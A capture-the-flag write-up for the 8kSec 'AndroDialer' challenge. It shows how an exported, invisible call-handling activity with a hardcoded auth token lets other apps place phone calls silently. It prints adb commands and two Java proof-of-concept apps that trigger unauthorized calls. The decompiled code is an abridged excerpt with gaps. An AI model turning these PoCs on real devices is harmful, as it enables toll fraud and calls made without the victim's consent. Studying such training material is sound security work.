---
title: AndroDialer - 8kSec
date: 2025-10-3 00:00:00 +/-TTTT
categories: [8kSec]
tags: [8kSec, writeup, mobile penetration testing, android]     # TAG names should always be lowercase

---

<br />

**Description**

Ever wanted to break free from the limitations of your regular Android dialer? Meet AndroDialer! A sleek, full‑featured dialer app that takes your calls to the next level.

It brings together smart contact organization, customizable quick‑dial widgets, and a “Business Focus” mode that filters interruptions so you stay in control of every conversation. Behind the scenes, AndroDialer delivers in‑depth call analytics to help you spot communication trends, plus enhanced security features. Its highly adaptable interface is complete with light and dark themes, call‑time limits, and fully personalized settings that strike the ideal balance of efficiency and elegance for both personal and professional calling.

<br />

**Objective**

Create a malicious application that exploits the AndroDialer application to initiate unauthorized phone calls to arbitrary numbers without the victim's knowledge or consent.

Successfully completing this challenge demonstrates a critical security vulnerability that could lead to financial fraud, privacy violations, and compromised communications security for AndroDialer users.

<br />

**Restrictions**

Your exploit must work on non-rooted Android devices running versions up to Android 15 and must not require any runtime permissions to be explicitly granted by the victim, making it appear harmless to users during installation.

<br />

**Explore the application**

When you open the application, a dialer interface appears, allowing you to enter a phone number and initiate a call

![](/assets/img/8ksec/AndroDialer/1.png)

<br />

The **Contacts** tab displays a list of all the saved contacts

<br />

![](/assets/img/8ksec/AndroDialer/2.png)

<br />

The **Recents** tab displays a log of all recent calls

![](/assets/img/8ksec/AndroDialer/3.png)

<br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.CALL_PHONE"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
<uses-permission android:name="android.permission.READ_CALL_LOG"/>
<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
<uses-permission android:name="android.permission.MANAGE_OWN_CALLS"/>
<uses-permission android:name="android.permission.ANSWER_PHONE_CALLS"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission
    android:name="android.permission.READ_EXTERNAL_STORAGE"
    android:maxSdkVersion="32"/>
<uses-permission
    android:name="android.permission.WRITE_EXTERNAL_STORAGE"
    android:maxSdkVersion="32"/>
<uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
<uses-permission android:name="android.permission.READ_CALENDAR"/>
<uses-permission android:name="android.permission.WRITE_CALENDAR"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
<uses-permission android:name="android.permission.VIBRATE"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="com.android.alarm.permission.SET_ALARM"/>
<uses-permission android:name="android.permission.WAKE_LOCK"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
```



<br />

```xml
<activity
    android:theme="@android:style/Theme.NoDisplay"
    android:name="com.eightksec.androdialer.CallHandlerServiceActivity"
    android:exported="true"
    android:taskAffinity=""
    android:excludeFromRecents="true">
    <intent-filter>
        <action android:name="com.eightksec.androdialer.action.PERFORM_CALL"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="tel"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="dialersec"
            android:host="call"/>
    </intent-filter>
</activity>
```

- **android:theme="@android:style/Theme.NoDisplay"** → The activity has **no visible UI**, meaning it runs in the background or performs logic without showing a screen.

- **android:exported="true"** → This makes the activity **accessible from other apps or external intents**, which can be a potential **attack surface** in a CTF context.

- **android:taskAffinity=""** → It does **not belong to any specific task**, so it won’t be grouped with other app activities.

- **android:excludeFromRecents="true"** → The activity will **not appear in the Recents** list after execution.

<br />

The activity can be triggered by **three different intent filters**, each defining what types of actions or URLs it can handle.

1. Custom Action

```xml
<intent-filter>
    <action android:name="com.eightksec.androdialer.action.PERFORM_CALL"/>
    <category android:name="android.intent.category.DEFAULT"/>
</intent-filter>
```

Responds to the custom action **com.eightksec.androdialer.action.PERFORM_CALL**.

<br />

2. Handling “tel:” Links

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="tel"/>
</intent-filter>
```

Allows the activity to handle `tel:` URIs (e.g. `tel:123456789`).

<br />

3. Custom “dialersec://call” Scheme

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data
        android:scheme="dialersec"
        android:host="call"/>
</intent-filter>
```

Defines a **custom URI scheme**: `dialersec://call`



<br />

From: com.eightksec.androdialer.CallHandlerServiceActivity

```java
public final class CallHandlerServiceActivity extends Activity {
    public final void onCreate(Bundle bundle) {
        String str;
        String path;
        int indexOf;
        super.onCreate(bundle);
        Uri data = getIntent().getData();
        ArrayList arrayList = new ArrayList();
        arrayList.add(getIntent().getStringExtra("enterprise_auth_token"));
 if (str7.equals("8kd1aL3R_s3Cur3_k3Y_2023") || str7.equals("8kd1aL3R-s3Cur3-k3Y-2023") || h.a(str, "8kd1aL3R_s3Cur3_k3Y_2023") || h.a(str, "8kd1aL3R-s3Cur3-k3Y-2023")) {
                    if (getIntent().hasExtra("phoneNumber")) {
                        str3 = getIntent().getStringExtra("phoneNumber");
                    } else {
                        Uri data2 = getIntent().getData();
                        if (h.a(data2 != null ? data2.getScheme() : null, "tel")) {
                            Uri data3 = getIntent().getData();
                            if (data3 != null) {
                                str3 = data3.getSchemeSpecificPart();
                            }
                        } else {
                            Uri data4 = getIntent().getData();
                            if (h.a(data4 != null ? data4.getScheme() : null, "dialersec")) {
                                Uri data5 = getIntent().getData();
                                if (h.a(data5 != null ? data5.getHost() : null, "call")) {
                                    Uri data6 = getIntent().getData();
                                    String queryParameter = data6 != null ? data6.getQueryParameter("number") : null;
                                    if (queryParameter == null || queryParameter.length() == 0) {
                                        List<String> pathSegments3 = data != null ? data.getPathSegments() : null;
                                        Integer valueOf = pathSegments3 != null ? Integer.valueOf(pathSegments3.indexOf("number")) : null;
                                        if (valueOf != null && valueOf.intValue() >= 0 && valueOf.intValue() < pathSegments3.size() - 1) {
                                            str3 = pathSegments3.get(valueOf.intValue() + 1);
                                        }
                                    } else {
                                        str3 = queryParameter;
                                    }
                                }
                            }
                            String dataString = getIntent().getDataString();
                            if (dataString != null && b.o0(dataString, "tel:", false)) {
                                String dataString2 = getIntent().getDataString();
                                if (dataString2 != null) {
                                    str3 = b.x0(dataString2, "tel:");
                                }
                            } else if (data == null || (path = data.getPath()) == null || !b.o0(path, ";number=", false)) {
                                String dataString3 = getIntent().getDataString();
                                Pattern compile2 = Pattern.compile("\\d+");
                                h.e(compile2, "compile(...)");
                                if (dataString3 == null) {
                                    dataString3 = "";
                                }
                                Matcher matcher2 = compile2.matcher(dataString3);
                                h.e(matcher2, "matcher(...)");
                                c cVar2 = !matcher2.find(0) ? null : new c(matcher2, dataString3);
                                if (cVar2 != null) {
                                    str3 = ((Matcher) cVar2.f8662h).group();
                                    h.e(str3, "group(...)");
                                }
                            } else {
                                String path3 = data.getPath();
                                if (path3 != null) {
                                    str3 = b.z0(b.x0(path3, ";number="), ";");
                                }
                            }
                        }
                    }
                    if (str3 == null || str3.length() == 0) {
                        Log.e("CallHandlerService", "No target contact found in request: " + getIntent());
                    } else {
                        try {
                            Intent intent = new Intent("android.intent.action.CALL");
                            intent.setData(Uri.parse("tel:" + str3));
                            intent.addFlags(268435456);
                            startActivity(intent);
                        } catch (Exception e10) {
                            Log.e("CallHandlerService", "Call service connection failed", e10);
                        }
                    }
                    finish();
                    return;
                }
            }
        }
        Log.e("CallHandlerService", "Enterprise authorization failed - invalid token provided");
        finish();
    }
}
```

`CallHandlerServiceActivity` is an exported, non-UI activity that accepts external intents to place phone calls. On startup it reads an `enterprise_auth_token` extra (and possibly other strings) and checks it against hardcoded/utility checks; if the token is valid the activity tries to resolve a target number from several sources (in priority order) and then launches `android.intent.action.CALL` with a `tel:` URI to place the call. The component is declared with `Theme.NoDisplay` and `android:exported="true"`.

- When the URI scheme is `dialersec` and the host is `call`, the activity looks for a `phoneNumber` intent extra and verifies that the deeplink’s `enterprise_auth_token` query parameter equals `8kd1aL3R_s3Cur3_k3Y_2023`.
- If the URI scheme is `tel`, the activity verifies that the `enterprise_auth_token` extra equals `8kd1aL3R_s3Cur3_k3Y_2023` and extracts the phone number directly from the deeplink (e.g., `tel:01000000000`).

<br />

**Exploit the app using adb**

1. with the  "dialersec" scheme

```
adb shell am start -n com.eightksec.androdialer/.CallHandlerServiceActivity -a com.eightksec.androdialer.action.PERFORM_CALL --es 'phoneNumber' '01000000000' -d 'dialersec://call?enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023'
```

<br />

2. with the `tel:` scheme

```
adb shell am start -n com.eightksec.androdialer/.CallHandlerServiceActivity  -a com.eightksec.androdialer.action.PERFORM_CALL  -d 'tel:01000000000'  --es 'enterprise_auth_token' '8kd1aL3R_s3Cur3_k3Y_2023'
```

<br />

**Android app PoC**

1. with the  "dialersec" scheme

```java
package com.example.androdialer;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.button);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("com.eightksec.androdialer", "com.eightksec.androdialer.CallHandlerServiceActivity");
                intent.setAction("com.eightksec.androdialer.action.PERFORM_CALL");
                intent.putExtra("phoneNumber", "01000000000");
                intent.setData(Uri.parse("dialersec://call?enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023"));
                startActivity(intent);
            }
        });
    }
}
```

<br />

2. with the `tel:` scheme

```java
package com.example.androdialer;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.button);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("com.eightksec.androdialer", "com.eightksec.androdialer.CallHandlerServiceActivity");
                intent.setAction("com.eightksec.androdialer.action.PERFORM_CALL");
                intent.putExtra("enterprise_auth_token", "8kd1aL3R_s3Cur3_k3Y_2023");
                intent.setData(Uri.parse("tel:01000000000"));
                startActivity(intent);
            }
        });
    }
}
```

